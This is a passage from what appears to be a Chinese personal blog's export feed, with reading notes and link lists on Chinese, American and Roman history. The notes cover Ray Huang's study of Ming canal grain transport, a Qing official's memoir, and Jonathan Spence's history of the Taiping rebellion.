    <title>中国军事史 | Military History of China</title>
    <url>/2019/06/07/History-Military-CN/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="推荐课程"><a href="#推荐课程" class="headerlink" title="推荐课程"></a>推荐课程</h2><h3 id="战争之外的军事史"><a href="#战争之外的军事史" class="headerlink" title="战争之外的军事史"></a><a href="#">战争之外的军事史</a></h3><ul>
<li>主讲人：<a href="#">国立台湾大学历史系：方震华</a></li>
</ul>
<h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><ul>
<li><p>府兵制（兵农合一）之发生、源流及证伪，破除迷信、大有裨益。</p>
</li>
<li><p>最大的障碍还是枪杆子，如果不能实现军民融合、文官节制武将，议会斗争、司法独立几乎不可能存在</p>
</li>
</ul>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>美国军事史 | Military History of United States</title>
    <url>/2019/06/07/History-Military-USA/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="推荐课程"><a href="#推荐课程" class="headerlink" title="推荐课程"></a>推荐课程</h2><h4 id="美军军事史-1775-1945"><a href="#美军军事史-1775-1945" class="headerlink" title="美军军事史 1775-1945"></a>美军军事史 1775-1945</h4><ul>
<li>《美国军事史,Military History of the United States 1775-1945》</li>
<li>主讲人：北京师范大学 | 贾珺</li>
<li><a href="http://www.icourse163.org/course/BNU-1002837012" target="_blank" rel="noopener">中国大学MOOC链接</a></li>
</ul>
<h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><ul>
<li>Stephen Morillo,Michael F.Pavkovic,What is Military History,Cambridge:Polity Press,2006,pp.3-5.</li>
<li>James Bradford,Atlas of American Military History,Oxford:Oxford University Press,2003.(美国军事史图册，地图)</li>
<li>Jeremy Black,America as a Military Power:from the American Revolution to the Civil War,Westport:Praeger,2002.</li>
<li>军事科学院外军部：《美国军事基本状况》，军事科学出版社，2013年。</li>
<li>陈海宏：《美国军事史纲》，长征出版社，1991年。</li>
<li>（美）卡罗尔·帕金克里斯托弗·米勒等：《美国史》上册，葛腾飞、张金兰译，中国出版集团东方出版中心，2013年。</li>
<li>（英）约翰·富勒：《西洋世界军事史》，卷二，钮先钟译，广西师范大学出版社，2004年。</li>
<li>（英）安德鲁·兰伯特：《风帆时代的海上战争》，郑振清、向静译，上海人民出版社，2005年。</li>
<li>（美）安德鲁·卡洛尔：《美军战争家书》，李静滢译，昆仑出版社，2005年。</li>
<li>（美）詹姆斯·莫里斯：《美国军队及其战争》，符金宇译，世界图书出版公司，2013年。</li>
</ul>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>明史 | History of Empire</title>
    <url>/2017/06/25/History-Ming/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
<li><a href="http://www.jianshu.com/p/8376f08e6b90" target="_blank" rel="noopener">黄仁宇:《放宽历史的视界》</a></li>
<li><a href="http://www.jianshu.com/p/b2bc9871d129" target="_blank" rel="noopener">黄仁宇:《万历十五年》</a></li>
</ul>
<h1 id="明初"><a href="#明初" class="headerlink" title="明初"></a>明初</h1><h1 id="明中"><a href="#明中" class="headerlink" title="明中"></a>明中</h1><h1 id="明晚"><a href="#明晚" class="headerlink" title="明晚"></a>明晚</h1><ul>
<li><a href="https://riboseyim.github.io/2017/06/25/MrLizicheng/" target="_blank" rel="noopener">明史：李自成</a></li>
</ul>
<h2 id="文艺作品"><a href="#文艺作品" class="headerlink" title="文艺作品"></a>文艺作品</h2><ul>
<li><a href="#">影视《大明王朝1956》</a>：政府财政逻辑</li>
<li><a href="#">小说《明朝那些事》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>清史 | History of Empire</title>
    <url>/2017/06/24/History-Qing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>明清交际：李自成</li>
<li>康雍乾</li>
<li>嘉庆、道光、咸丰：太平天国、张集馨</li>
<li>同治、光绪：谭嗣同</li>
</ul>
<a id="more"></a>
<h2 id="明清交际"><a href="#明清交际" class="headerlink" title="明清交际"></a>明清交际</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/25/MrLizicheng/" target="_blank" rel="noopener">明史：李自成</a></li>
</ul>
<h2 id="康雍乾"><a href="#康雍乾" class="headerlink" title="康雍乾"></a>康雍乾</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
<li>雍正《大义觉迷录》</li>
<li>史景迁|《康熙与曹寅》</li>
<li>孔飞力|《叫魂》</li>
</ul>
<h2 id="嘉庆、道光、咸丰"><a href="#嘉庆、道光、咸丰" class="headerlink" title="嘉庆、道光、咸丰"></a>嘉庆、道光、咸丰</h2><h4 id="史景迁：《太平天国》"><a href="#史景迁：《太平天国》" class="headerlink" title="史景迁：《太平天国》"></a><a href="https://riboseyim.github.io/2017/01/30/TaipingHeavenly/" target="_blank" rel="noopener">史景迁：《太平天国》</a></h4><h4 id="张集馨《时晴斋主人自叙年谱》"><a href="#张集馨《时晴斋主人自叙年谱》" class="headerlink" title="张集馨《时晴斋主人自叙年谱》"></a>张集馨《时晴斋主人自叙年谱》</h4><ul>
<li>吏治：贿赂公行，政由贿出</li>
<li>刑狱：上下交通，枉法裁判</li>
<li>财政：巧立名目，巧取豪夺</li>
<li>军队：营制败坏，军纪荡然</li>
<li>背景：张集馨的个人生活</li>
<li>附录：张集馨的生平年表</li>
</ul>
<p>中华书局1981年编辑出版 <strong>《道咸宦海见闻录》</strong>，作者：张集馨，（1800年－1879年），字椒云，别号时晴斋主人，江苏仪征人。道光咸丰年间历任翰林院、太原知府、道员，福建、陕甘、四川、河南、直隶、江西等省按察使、布政使、署理巡抚等职。</p>
<p>不同于一般大官僚自订或后人编述的年谱，多是连篇累牍自我吹嘘和阿谀谄媚之辞，该年谱主要为其任职其间所经历的官场人事浮沉、立以敏锐观察及看法之记录，记述详实但观点从己身出。张集馨翰林出身，擅长文墨、观察敏锐，其所处的时代正是清朝遭受内忧外患冲击至大之大动荡前期，张任职范围覆盖大江南北，更以一介文士多次出入幕府、统兵作战，阅历丰富，而且再加上几起几落，对于当时的政情吏治、世风民情，有较为清醒的认识。正如一个不具名的传抄者曾说：“这部书名为年谱，其实几乎等同于小说，对官场鬼蜮情形，刻画入微，不亚于清末之《官场现形记》、《二十年目睹之怪现状》”。</p>
<h2 id="同治、光绪"><a href="#同治、光绪" class="headerlink" title="同治、光绪"></a>同治、光绪</h2><h4 id="最后的豪侠：谭嗣同"><a href="#最后的豪侠：谭嗣同" class="headerlink" title="最后的豪侠：谭嗣同"></a><a href="https://riboseyim.github.io/2017/04/20/MrTanSitong/" target="_blank" rel="noopener">最后的豪侠：谭嗣同</a></h4><h4 id="戊戌六君子"><a href="#戊戌六君子" class="headerlink" title="戊戌六君子"></a>戊戌六君子</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/%E6%88%8A%E6%88%8C%E5%85%AD%E5%90%9B%E5%AD%90.png" alt></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://archive.ihp.sinica.edu.tw/officerc/officerkm2?!!FUNC2" target="_blank" rel="noopener">清代职官资料库|台湾中央研究院历史语言研究所</a></li>
<li><a href="https://qinghistorysg.com" target="_blank" rel="noopener">新加坡清史研究网|Qing History Society (Singapore)</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>黄仁宇：明代的漕运</title>
    <url>/2017/05/28/History-Caoyun/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>从明代帝王、大臣管理漕运的方法中，我们可以推断描绘明代的政治体制、政府模式、财政政策以及社会风俗和统治思想。</p>
<a id="more"></a>
<h1 id="明代的漕运"><a href="#明代的漕运" class="headerlink" title="明代的漕运"></a>明代的漕运</h1><h2 id="第一章-京杭大运河的背景和本文的研究目的"><a href="#第一章-京杭大运河的背景和本文的研究目的" class="headerlink" title="第一章 京杭大运河的背景和本文的研究目的"></a>第一章 京杭大运河的背景和本文的研究目的</h2><p>明朝宫廷对大运河的依赖程度前所未有，远远超过以前的历代王朝。<br>元朝时期的运河不过是海运的辅助性交通，无关紧要。而在明代，大运河是京城和江南之间唯一的交通运输线，所有供应都要经过它。（p16）</p>
<p>在供应名单中，除了谷物占据首要地位外，其他物品包括新鲜蔬菜和水果、家禽、纺织品、木料、文具、瓷器、漆——几乎所有中国所产的各种物品都通过大运河进行输送；诸如箭杆和制服之类的军需品，苕帚和竹耙之类的家用器具，也经过运河运送到北京去。整个明代，这种依赖性一直存在，从未中断。(p16)</p>
<p>概括大运河的背景情况，就是以一种特定方法把一个民族的大致情况描绘出来。从明代帝王、大臣管理漕运的方法中，我们可以推断描绘明代的政治体制、政府模式、财政政策以及社会风俗和统治思想。（p17）</p>
<h2 id="第二章-京杭大运河的地形概况"><a href="#第二章-京杭大运河的地形概况" class="headerlink" title="第二章 京杭大运河的地形概况"></a>第二章 京杭大运河的地形概况</h2><blockquote>
<p>维持这些运河，主要在于使它们能够通航的费用，如一位数学家说的，每年达到一百万。所有这些对欧洲人来说似乎是非常奇怪的，他们可以从地图上判断，人们可以采取一条既近而花费又少的从海上到北京的路线。这可能确实是真的。但害怕海洋和侵扰海岸的海盗，在中国人的心里是如此之根深蒂固，以致他们认为从海路向朝廷运送供应品会危险得多。(利玛窦：《十六世纪的中国——利玛窦札记（1583-1610）》，page 306)</p>
</blockquote>
<h2 id="第三章-明代管理大运河的行政机构"><a href="#第三章-明代管理大运河的行政机构" class="headerlink" title="第三章 明代管理大运河的行政机构"></a>第三章 明代管理大运河的行政机构</h2><p>明政府倾向于在前台维持一套僵硬的官僚体制，在后台进行调整和控制。虽然明廷因实际情况而不得不做一些改革，但在同时又尽力维持已经设置起来的官僚体制，甚至为此不惜折中解决官员职能。这样，虽然例外增加了一些临时性机构，但明廷从未设法对政府机构做定期调整，总是继续维持着官僚体制的表面性。……存在着职责规定不明、职务断裂、双套中央政府机构、机构重叠之类的毛病。（p45）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ming_Caoyun_System_20170528.png" alt></p>
<p>漕运总督一职的职责没有清楚地规定，担任者就有机会显示自己的个人特性。既然此职的职掌五花八门，这就需要任职者的才能全面，能够发挥自己的创造性。事实证明，担任此职的，从整体来看，都是一些精力充沛、意志坚定、处事果断的官员。(p54) …… 在91名漕运总督中，有32位随后成为内阁成员。考虑明代内阁职位经常被势力强大的人物长时期独占，这个纪录就值得注意。（p55）</p>
<p>明政府在清江浦设有检查站，负责征税：1、打造船只原来的货物税，实物征收，包括木材、竹子、铸铁、石灰、麻、煤和桐油。2、其他物品则由淮安府负责征收通行税。检查站官吏由淮安知府派任首席代表、办事吏员，工部清江浦分司郎中派任副官，山阳县派遣卫兵和勤杂工。全部职员超过100名。（p60）检查站所有征税收据和账簿由漕运总督签发，受其严密监督。</p>
<p>尽管明代官僚体制被严格地划分为几部分——文官系统和军事系统之间、京官和地方官之间、尚书大臣和朝廷特派官员（commissionary）之间,明显存在着不可跨越的鸿沟——然而下层官僚体制，比如我们上面提到的分支机构，却表现出足够的适应能力，使各个部分能够一直地运作起来。来自各个对立系统的官吏能够组织在一起。（p62）</p>
<h2 id="第四章-漕粮运输"><a href="#第四章-漕粮运输" class="headerlink" title="第四章 漕粮运输"></a>第四章 漕粮运输</h2><p>明朝统治早期，全国税额总数接近2950万石。1200万石由地方政府支配，作为官俸、行政费、抚恤金和养老金、赈济费、官府学校费和地方粮仓储存费。另外800万石，主要在华北征收，作为驻守西北前线军队的军粮。其余不到1000万石的税粮，供中央政府花费，其中120.8万石给南京，北京所得总数在820万石左右。（p71）</p>
<p>稳定性是漕运体系运作的一大显著特点。它基本上反映了明廷努力根据预定计划，固定国库收入和支出。</p>
<p>漕军堕落和普遍贫困。（暂略）<br>明初38万世袭军户，十六世纪早期下降到5万户，原因军户逃亡。</p>
<p>“解户”制导致贫困和破产（暂略）：税粮必须由纳税人运送到目的地。</p>
<p>西北地区不得不从其他地区购买茶叶、盐和纺织材料之类的必需品，又找不到平衡贸易和增加收入的途径，西北地区银两大量外流，导致该地区在随后的时期全面萧条。（p123）</p>
<p>早期由于前线地区要用粮食付税，盐商会在边境地区拥有自己的土地。1492年，明廷宣布用银两支付，盐商从北方地区变卖土地离开。（p124）</p>
<p>危机：明王朝由于不能动员地方资源为其目的服务，导致其统治全面削弱。（p135）</p>
<p>误区：漕河在明王朝统治后期仍然完整无损，漕运数量也未大幅度下降。漕河水道状况同明王朝统治的崩溃并无什么关系（p136）</p>
<p>败因：明廷失败原因起源于其君臣盲目地执行明王朝建立者制定的总计划。一旦先例确立起来，即使有的并不合理，他们不愿意也无力加以改变。（p140）在明王朝统治后期，虽然已经发现了它存在不足，但是明廷未采取任何措施加以改进。同时，看来并无任何其他候补体系取代它。（p142）</p>
<h2 id="第五章-宫廷供应品的漕运"><a href="#第五章-宫廷供应品的漕运" class="headerlink" title="第五章 宫廷供应品的漕运"></a>第五章 宫廷供应品的漕运</h2><p>在宦官催促的影响下，皇帝通常在旧的供应商品之外，命令进贡新品种。从理论上说，新增加的物品应该从供应地区所承担的土地税中扣除，而实际上，明廷常常“忽视”扣除，有关地区必须毫无补偿地进贡。而且，先例一开，除非撤销，有关府县就必须维持、继续。（p145）</p>
<p>各类供应品的相关数据（暂略）</p>
<p>明廷变成一种张开血嘴的庞然大物，迅速吞没了全国的额外生产。它所设置的宗人府，是成千上万人的“食堂”。在一定程度上，明廷也变成了消费品的分配中心。它把各种各样的供应分配给贵族家庭和政府官员。这样，明政府就进一步把国家顶层的购买力取消了，私人商业没有什么发展的机会和余地了。（p176）</p>
<h2 id="第六章-征税、商业、旅行和劳役"><a href="#第六章-征税、商业、旅行和劳役" class="headerlink" title="第六章 征税、商业、旅行和劳役"></a>第六章 征税、商业、旅行和劳役</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>明代官僚反对改变国家的农业大国形象，不愿意去进行任何发展实验；这种情况可以说明他们那个时代的“新”政治观念和思想观念，是缺乏独创性的。</p>
<p>在15世纪早期设置的漕运体系及其附属机构，尽管存在着调查不足，仍然是解决问题的方法，具有一定的合理性。但是在16世纪，这个体系由于僵化，其中许多设置明显过时了。到该世纪末和17世纪早期，明代官员明显落后于时代的发展了。他们管理国家的思想观念和现实之间的断裂，再不能以技术补救来解决了。根本原因在于，他们的思想没有活力，已经僵化了。</p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ol>
<li>D.C. 特威切特：《唐朝的财政金融管理制度》</li>
<li>贺凯：《明王朝的政府组织》(Governmental Organization of the Ming Dynasty)（对明代政府机构作了综合性考察）</li>
<li>佐久间重男：《明代商税征收和财政之间的关系》</li>
<li>安东尼-佛朗西斯-普雷沃斯：《耶稣会士的历史性旅行》</li>
<li>D. 盖达（D. Gandar）牧师：《运河帝国》（Le Canal Imperial）(对淮河和长江之间的大运河河段和航图进行研究)</li>
<li>吴缉华：《明代海运及运河的研究》（台北，1961年版）</li>
</ol>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><img src="https://i.imgur.com/MsXaOdV.jpg" alt="Medieval trade networks v.4"></li>
<li><a href="http://economy.guoxue.com/?p=9558" target="_blank" rel="noopener">明代的镇守中官制度 | 方志远</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>罗马史 | History of Empire</title>
    <url>/2018/12/31/History-Rome/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="《罗马帝国衰亡史》"><a href="#《罗马帝国衰亡史》" class="headerlink" title="《罗马帝国衰亡史》"></a>《罗马帝国衰亡史》</h2><blockquote>
<p>君士坦丁发布了一道敕令，明确表示他真的 ，或假装着怀疑有人正在阴谋策划推翻他本人和他的政府 。他还以荣誉或重金报酬为诱饵 ，呼唤各种层次的告密者可以放胆告发他的执政官或大臣，他的朋友或最贴身的亲信 ，无一例外 ；他还庄严宣布 ，他将亲自聆听这些指控 ，并将亲自对有害于他的人进行报复 ；最后 ，他还用一段祷告结束他的敕令 ，这祷词倒真是表露出了他对某种危险的担忧 ，他祈求最高的神灵仍一如既往保佑皇帝和帝国的安全 。</p>
<p>罗马教会以暴力保卫他们以欺骗手段得来的帝国；一个和平和仁慈的体系很快就被放逐令、战争、屠杀以及宗教法庭的建立而弄得乌烟瘴气。而由于改革派更受到热爱民权和宗教自由的人们的鼓舞，天主教的亲王们便把自己的利益同教士的利益结合起来，并不惜用火与剑来推行宗教惩罚的恐怖。</p>
</blockquote>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/45617772" target="_blank" rel="noopener">国家能力的信息基础：来自神圣罗马帝国的证据</a><br>获取农业收成信息更容易的国家，享有更多的税收、更大的疆域和更长久的国祚</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651940487&amp;idx=1&amp;sn=65e67860424f2b723daa68c406b7085f&amp;chksm=bd5789958a2000834c3f4c3d5e23f3694eb2320af9c838c5853734a46c005361a9b0384546b2#rd" target="_blank" rel="noopener">微信公众号@睿哥杂货铺：推荐|《罗马帝国衰亡史》</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>太平天国史</title>
    <url>/2017/01/30/History-TaipingHeavenly/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>史景迁|《太平天国》</li>
</ul>
<a id="more"></a>
<h2 id="一、-史景迁-《太平天国》"><a href="#一、-史景迁-《太平天国》" class="headerlink" title="一、 史景迁|《太平天国》"></a>一、 史景迁|《太平天国》</h2><p>[美]史景迁 ，中译本，广西师范大学出版社</p>
<p>20170123 南京-&gt;广州（CZ3698）：总序，前四章<br>20170130 于都 通阅  （春节）</p>
<p>等待时间长、延误概率高、环境噪声大、无法交谈、手机等电子设备关机，无聊感强烈。<br>没有比机舱内更合适看书的场景了，如果手上有一本书，可以看得很专注。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-0.png" alt></p>
<h4 id="1、作者：史景迁"><a href="#1、作者：史景迁" class="headerlink" title="1、作者：史景迁"></a>1、作者：史景迁</h4><p>Jonathan Spence <a href="https://zh.wikipedia.org/wiki/%E5%8F%B2%E6%99%AF%E8%BF%81" target="_blank" rel="noopener">人物Wiki词条</a></p>
<p>特点：文笔流畅，雅俗共赏，兼顾学术研究与通俗阅读。<br>“把中国近代错综复杂的人物和史事，通过严谨的历史考证，参照专家的钻研成果，以说故事的方法娓娓道来”。</p>
<p>著作集：</p>
<ol>
<li>《曹寅与康熙》 (Ts’ao Yin and the K’ang-hsi Emperor:Bondservant and Master) 1965</li>
<li>《改变中国》 (To Change China:Western Advisers in China,1620-1960)</li>
<li>《康熙》 (Emperor of China:Self-Portrait of K’ang-hsi)</li>
<li>《王氏之死》(The Death of Woman Wang)</li>
<li>《追寻现代中国》（The Search for Modern China）</li>
<li>《太平天国》(God’s Chinese Son:The Taiping Heavenly Kingdom of Hong Xiuquan)</li>
<li>《雍正王朝之大义觉迷》(Treason by the Book)</li>
<li>《前朝梦忆》(Return to Dragon Mountain: memories of a Late Ming Man)</li>
</ol>
<h4 id="2、来华传教士"><a href="#2、来华传教士" class="headerlink" title="2、来华传教士"></a>2、来华传教士</h4><p>人物：埃德温-史蒂文斯牧师（Rev. Edwin Stevens）<br>1832年10月 广州 “美国海员友好协会” （American Seaman’s Friend Society）<br>耶鲁学院（Yale College） : 新英格兰 “觉醒” 思潮<br>纽文海神学院(New Haven Theological Seminary)</p>
<p>技术：印刷</p>
<p>人物：梁发<br>家贫，读书四年，刻字版为生。<br>受雇于苏格兰新教传教士米怜（William Milne）,刻版、翻译。<br>1827年，“伦敦传道会” (London Missionary Society) ,被任命为传教士。</p>
<p>人物：郭士立<br>基督教”摩拉维亚兄弟会”（Moravian Brethren）</p>
<h4 id="3、科举制"><a href="#3、科举制" class="headerlink" title="3、科举制"></a>3、科举制</h4><p>1836年春初，洪火秀到广州参加府试。<br>异兆：广州下了四十年来的第一场雪，足足两英寸厚。</p>
<p>1685年，设花县。距广州陆路三十英里，水路四十英里。</p>
<p>洪秀全：通过县试，未中府试<br>洪仁玕：读过书未能登第<br>冯云山：读过书未能登第<br>杨秀清：“不识得多字墨”<br>萧朝贵：“分外晓得道理”，实际知识，经验主义</p>
<p>“反孔子”</p>
<h4 id="4、客家人与流民问题"><a href="#4、客家人与流民问题" class="headerlink" title="4、客家人与流民问题"></a>4、客家人与流民问题</h4><p>因社会秩序动荡，迁徙不绝，以致于某些地区，客家人比土著还多，尤其又以山区为甚。<br>为了争夺居住地和耕地，摩擦不断。</p>
<p><strong>韦昌辉家族</strong>：设作坊，打造军械</p>
<h4 id="5、秘密会社与盗匪"><a href="#5、秘密会社与盗匪" class="headerlink" title="5、秘密会社与盗匪"></a>5、秘密会社与盗匪</h4><p>1805年，七大海盗首领曾结盟，将南中国海沿岸水域划分势力范围。<br>婚姻：家中姐妹女儿或劫掠女子嫁给其他海盗<br>收养：将可能成为首领的海盗收为义子<br>男性首领与俘虏发展同性恋关系<br>女性海盗首领：经营赌场，孀居广州，颇有资财。<br>香港（英国）当局，反海盗行动，海盗沿西江退入广西内河，与河匪结合。<br>两广水师疲弱，海盗坐大，从香港进口军火器械。</p>
<p>三合会</p>
<h4 id="6、军事组织"><a href="#6、军事组织" class="headerlink" title="6、军事组织"></a>6、军事组织</h4><p>人物：冯云山</p>
<p>设计号旗系统：<br>伍长：管辖四人<br>两司马：管辖五个伍长 （25人）：两尺半 方形号旗<br>卒长：管辖四个两司马 （104人）：卫旗<br>旅帅：<br>师帅：<br>军帅：管辖五个师帅 （13155人）</p>
<h4 id="7、太平军技术进化路线"><a href="#7、太平军技术进化路线" class="headerlink" title="7、太平军技术进化路线"></a>7、太平军技术进化路线</h4><p>围攻长沙时期：精于建浮桥以集结部队，一座浮桥即跨越湍急的湘江<br>矿工：广西、湖南招募数千名，积蓄大量火药，坑道作业<br>水师：长沙四周河道，夺取几千艘船，船队浩荡，吸引更多的新成员加入；舰船与陆地火炮配合；通讯系统。</p>
<p>撤离长沙：技术、协调娴熟，沿湘江直趋武昌。25天连续作战行军483公里。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-3.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-4.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-5.png" alt></p>
<h4 id="8、统治集团权力争夺与内部屠杀"><a href="#8、统治集团权力争夺与内部屠杀" class="headerlink" title="8、统治集团权力争夺与内部屠杀"></a>8、统治集团权力争夺与内部屠杀</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Taiping-P-8.png" alt></p>
<h4 id="9、意识形态与外交"><a href="#9、意识形态与外交" class="headerlink" title="9、意识形态与外交"></a>9、意识形态与外交</h4><h4 id="10、洪秀全与李自成对比"><a href="#10、洪秀全与李自成对比" class="headerlink" title="10、洪秀全与李自成对比"></a>10、洪秀全与李自成对比</h4><h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><ul>
<li><a href="http://www.jianshu.com/p/e9004fb31f3e" target="_blank" rel="noopener">读书笔记：《李自成》（姚雪垠 著）</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>唐史人物：狄仁杰</title>
    <url>/2018/01/17/History-Tang-DiRenjie/</url>
